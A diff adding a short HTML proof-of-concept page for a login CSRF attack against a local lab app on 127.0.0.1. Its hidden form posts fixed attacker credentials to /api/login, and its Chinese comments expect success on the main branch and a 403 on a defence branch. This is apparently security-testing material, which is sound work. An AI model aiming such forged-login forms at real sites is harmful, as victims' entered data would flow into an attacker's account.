@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><title>POC4 登录 CSRF</title></head>
+<body>
+<!--
+  POC4：登录 CSRF
+  目标接口：POST /api/login
+  前置：先在靶场里注册一个"攻击者账号" attacker / AttackerPass123!
+  效果：受害者浏览器被登录到攻击者账号，之后受害者填写的数据会进入攻击者账号。
+  预期：main 上受害者变成 attacker 登录；防御分支返回 403。
+-->
+<h1>POC4：登录 CSRF（本地实验）</h1>
+<form action="http://127.0.0.1:5000/api/login" method="POST">
+  <input type="hidden" name="username" value="attacker">
+  <input type="hidden" name="password" value="AttackerPass123!">
+  <button type="submit">触发实验请求</button>
+</form>
+</body></html>
